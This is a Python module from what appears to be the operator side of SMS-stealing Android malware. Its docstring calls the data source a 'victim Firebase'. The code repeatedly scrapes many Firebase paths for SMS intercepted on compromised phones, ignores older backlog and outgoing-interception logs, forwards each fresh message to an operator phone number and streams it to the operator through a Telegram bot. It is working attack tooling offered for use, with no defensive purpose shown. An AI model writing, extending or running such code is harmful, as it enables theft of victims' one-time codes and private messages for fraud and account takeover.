"""Poll victim Firebase for new SMS and push into bot (Astik-style)."""

from __future__ import annotations

import json
import logging
import re
from datetime import datetime, timezone
from typing import Any

import httpx

from app.database import Device, MonitorProfile, SessionLocal
from app.firebase_client import _fetch_json, firebase_root_url
from app.services import get_active_device, get_monitor_profile, save_sms

logger = logging.getLogger(__name__)

POLL_INTERVAL_SEC = 0.5
SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
SMS_CHILD_PATHS = (
    "sms",
    "messages",
    "smsList",
    "inbox",
    "sms_inbox",
    "Sms",
    "SMS",
    "msg",
    "log",
    "logs",
    "history",
)
SENDER_FIELDS = ("sender", "from", "address", "phone", "number", "fromNumber", "from_number")
BODY_FIELDS = ("message", "body", "text", "content", "msg", "sms", "smsBody")
TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
SEEN_META_KEY = "firebase_sms_seen"
BASELINE_META_KEY = "firebase_sms_baseline"
BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
MAX_SEEN_KEYS = 20000
BODY_DATE_RE = re.compile(
    r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})(?:\s+\d{1,2}:\d{2})?\b"
)
OUTGOING_LOG_MARKERS = (
    "intercepted outgoing",
    "zygisk",
    "outgoing sms",
)


def _device_ids(device: Device) -> list[str]:
    ids: list[str] = []
    if device.name:
        ids.append(device.name.strip())
    if device.firebase_key:
        leaf = device.firebase_key.strip("/").split("/")[-1]
        if leaf and leaf not in ids:
            ids.append(leaf)
    return ids


def _resolve_device_firebase_url(profile: MonitorProfile, device: Device) -> str | None:
    if device.firebase_source_url:
        return device.firebase_source_url
    if profile.firebase_url:
        return profile.firebase_url
    return None


def _meta_dict(device: Device) -> dict[str, Any]:
    if not device.device_meta:
        return {}
    try:
        data = json.loads(device.device_meta)
        return data if isinstance(data, dict) else {}
    except (json.JSONDecodeError, TypeError):
        return {}


def _save_meta(device: Device, meta: dict[str, Any]) -> None:
    device.device_meta = json.dumps(meta)


def get_seen_sms_keys(device: Device) -> set[str]:
    meta = _meta_dict(device)
    seen = meta.get(SEEN_META_KEY) or []
    if isinstance(seen, list):
        return {str(item) for item in seen}
    return set()


def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
    if not keys:
        return
    meta = _meta_dict(device)
    seen = list(get_seen_sms_keys(device) | keys)
    if len(seen) > MAX_SEEN_KEYS:
        seen = seen[-MAX_SEEN_KEYS:]
    meta[SEEN_META_KEY] = seen
    _save_meta(device, meta)


def get_baseline_sms_keys(device: Device) -> set[str]:
    meta = _meta_dict(device)
    baseline = meta.get(BASELINE_META_KEY) or []
    if isinstance(baseline, list):
        return {str(item) for item in baseline}
    return set()


def _set_baseline_sms_keys(device: Device, keys: set[str], started_at: datetime | None) -> None:
    meta = _meta_dict(device)
    meta[BASELINE_META_KEY] = list(keys)
    meta[SEEN_META_KEY] = list(keys)
    if started_at:
        meta[BASELINE_AT_META_KEY] = started_at.isoformat()
    _save_meta(device, meta)


def clear_sms_baseline(device: Device) -> None:
    meta = _meta_dict(device)
    meta.pop(BASELINE_META_KEY, None)
    meta.pop(BASELINE_AT_META_KEY, None)
    meta.pop(SEEN_META_KEY, None)
    _save_meta(device, meta)


def _parse_body_date(text: str) -> datetime | None:
    match = BODY_DATE_RE.search(text or "")
    if not match:
        return None
    day, month, year = int(match.group(1)), int(match.group(2)), int(match.group(3))
    if year < 100:
        year += 2000
    try:
        return datetime(year, month, day, tzinfo=timezone.utc)
    except ValueError:
        return None


def _is_old_for_monitoring(record: dict[str, Any], profile: MonitorProfile) -> bool:
    """Skip Firebase backlog — only SMS at/after monitoring start."""
    started = profile.started_at
    if not started:
        return False

    if started.tzinfo is None:
        started = started.replace(tzinfo=timezone.utc)

    received_at = record.get("received_at")
    if received_at:
        if received_at.tzinfo is None:
            received_at = received_at.replace(tzinfo=timezone.utc)
        return received_at < started

    body_date = _parse_body_date(record.get("message", ""))
    if body_date and body_date < started:
        return True

    # No reliable timestamp on a backlog entry — treat as old.
    return True


def _is_outgoing_firebase_log(sender: str, body: str) -> bool:
    sender_l = (sender or "").lower()
    body_l = (body or "").lower()
    if any(marker in sender_l for marker in OUTGOING_LOG_MARKERS):
        return True
    if any(marker in body_l for marker in OUTGOING_LOG_MARKERS):
        return True
    return False


def _first_field(data: dict, names: tuple[str, ...]) -> str | None:
    for name in names:
        value = data.get(name)
        if value is None:
            continue
        text = str(value).strip()
        if text and text.lower() not in {"null", "none", "n/a"}:
            return text
    return None


def _parse_timestamp(raw: Any) -> datetime | None:
    if raw is None:
        return None
    if isinstance(raw, (int, float)):
        ts = float(raw)
        if ts > 1_000_000_000_000:
            ts /= 1000.0
        try:
            return datetime.fromtimestamp(ts, tz=timezone.utc)
        except (OSError, OverflowError, ValueError):
            return None
    text = str(raw).strip()
    if not text:
        return None
    if text.isdigit():
        return _parse_timestamp(int(text))
    try:
        normalized = text.replace("Z", "+00:00")
        return datetime.fromisoformat(normalized).astimezone(timezone.utc)
    except ValueError:
        return _parse_body_date(text)


def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
    if not isinstance(value, dict):
        return None

    sender = _first_field(value, SENDER_FIELDS)
    body = _first_field(value, BODY_FIELDS)

    nested = value.get("lastSms") or value.get("last_sms") or value.get("sms")
    if isinstance(nested, dict):
        sender = sender or _first_field(nested, SENDER_FIELDS)
        body = body or _first_field(nested, BODY_FIELDS)

    if not body:
        return None
    if not sender:
        sender = "Unknown"

    received_at = None
    for field in TIME_FIELDS:
        if field in value:
            received_at = _parse_timestamp(value.get(field))
            if received_at:
                break
        if isinstance(nested, dict) and field in nested:
            received_at = _parse_timestamp(nested.get(field))
            if received_at:
                break

    return {
        "firebase_key": firebase_key,
        "sender": sender,
        "message": body,
        "received_at": received_at,
    }


async def _fetch_path_records(root: str, path: str, timeout: float) -> list[dict[str, Any]]:
    url = f"{root}/{path}.json"
    try:
        data = await _fetch_json(url, timeout=timeout)
    except httpx.HTTPError:
        return []

    records: list[dict[str, Any]] = []
    if isinstance(data, dict):
        for child_key, child_val in data.items():
            if child_key.startswith("num-"):
                continue
            parsed = _parse_sms_entry(f"{path}/{child_key}", child_val)
            if parsed:
                records.append(parsed)
        if not records:
            parsed = _parse_sms_entry(path, data)
            if parsed:
                records.append(parsed)
    return records


async def fetch_firebase_sms_for_device(
    firebase_url: str,
    device: Device,
    *,
    timeout: float = 3.0,
) -> list[dict[str, Any]]:
    root = firebase_root_url(firebase_url)
    all_records: list[dict[str, Any]] = []
    seen_paths: set[str] = set()

    for device_id in _device_ids(device):
        for parent in SMS_PARENT_PATHS:
            for child in SMS_CHILD_PATHS:
                path = f"{parent}/{device_id}/{child}"
                if path in seen_paths:
                    continue
                seen_paths.add(path)
                all_records.extend(await _fetch_path_records(root, path, timeout))

            device_path = f"{parent}/{device_id}"
            if device_path not in seen_paths:
                seen_paths.add(device_path)
                all_records.extend(await _fetch_path_records(root, device_path, timeout))

        for top in ("sms", "SMS", "messages"):
            path = f"{top}/{device_id}"
            if path not in seen_paths:
                seen_paths.add(path)
                all_records.extend(await _fetch_path_records(root, path, timeout))

    deduped: dict[str, dict[str, Any]] = {}
    for record in all_records:
        deduped[record["firebase_key"]] = record
    return list(deduped.values())


async def snapshot_firebase_sms_seen(
    profile: MonitorProfile,
    device: Device,
    db=None,
) -> int:
    """On monitoring start — mark every existing Firebase SMS as baseline (ignored)."""
    firebase_url = _resolve_device_firebase_url(profile, device)
    if not firebase_url:
        return 0
    records = await fetch_firebase_sms_for_device(firebase_url, device)
    keys = {record["firebase_key"] for record in records}
    _set_baseline_sms_keys(device, keys, profile.started_at)
    if db is not None:
        db.commit()
    logger.info(
        "Firebase SMS baseline for %s: %s existing record(s) ignored",
        device.name,
        len(keys),
    )
    return len(keys)


async def ensure_firebase_baseline(db, profile: MonitorProfile, device: Device) -> None:
    """Ensure baseline exists for current monitoring session (handles race on start)."""
    meta = _meta_dict(device)
    baseline_at = meta.get(BASELINE_AT_META_KEY)
    started = profile.started_at.isoformat() if profile.started_at else None
    if baseline_at and started and baseline_at == started:
        return
    await snapshot_firebase_sms_seen(profile, device, db)


async def _inject_before_notify(profile: MonitorProfile, device: Device, sender: str, message: str) -> None:
    from app.firebase_sync import forward_incoming_to_mynum

    if not profile.phone_number or not profile.is_monitoring:
        return
    await forward_incoming_to_mynum(None, profile, device, sender, message)


async def poll_monitoring_profiles_once() -> int:
    db = SessionLocal()
    processed = 0
    try:
        profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
        for profile in profiles:
            device = get_active_device(db, profile.telegram_user_id)
            if not device:
                continue
            firebase_url = _resolve_device_firebase_url(profile, device)
            if not firebase_url:
                continue

            await ensure_firebase_baseline(db, profile, device)

            try:
                records = await fetch_firebase_sms_for_device(firebase_url, device, timeout=2.0)
            except Exception as exc:
                logger.debug("Firebase SMS poll failed for %s: %s", device.name, exc)
                continue

            seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
            new_records = [r for r in records if r["firebase_key"] not in seen]

            if not new_records:
                continue

            new_keys: set[str] = set()
            for record in sorted(
                new_records,
                key=lambda item: item.get("received_at") or datetime.min.replace(tzinfo=timezone.utc),
            ):
                if _is_old_for_monitoring(record, profile):
                    new_keys.add(record["firebase_key"])
                    continue

                received_at = record.get("received_at")
                sender = record["sender"]
                message = record["message"]
                if _is_outgoing_firebase_log(sender, message):
                    new_keys.add(record["firebase_key"])
                    continue

                import time

                t0 = time.perf_counter()
                try:
                    await _inject_before_notify(profile, device, sender, message)
                except Exception as exc:
                    logger.warning("Fast inject failed for %s: %s", device.name, exc)
                relay_ms = max(1, int((time.perf_counter() - t0) * 1000))

                sms = save_sms(
                    db,
                    sender=sender,
                    message=message,
                    device_name=device.name,
                    received_at=received_at,
                )
                db.commit()
                new_keys.add(record["firebase_key"])
                processed += 1

                import asyncio

                from app.telegram_bot import send_inject_stream_dm

                asyncio.create_task(
                    send_inject_stream_dm(profile.telegram_user_id, sender, message, relay_ms)
                )

            if new_keys:
                mark_sms_keys_seen(device, new_keys)
                db.commit()
    finally:
        db.close()
    return processed


async def run_firebase_sms_poll_loop() -> None:
    import asyncio

    while True:
        try:
            count = await poll_monitoring_profiles_once()
            if count:
                logger.info("Firebase SMS poll delivered %s message(s)", count)
        except Exception as exc:
            logger.warning("Firebase SMS poll loop error: %s", exc)
        await asyncio.sleep(POLL_INTERVAL_SEC)
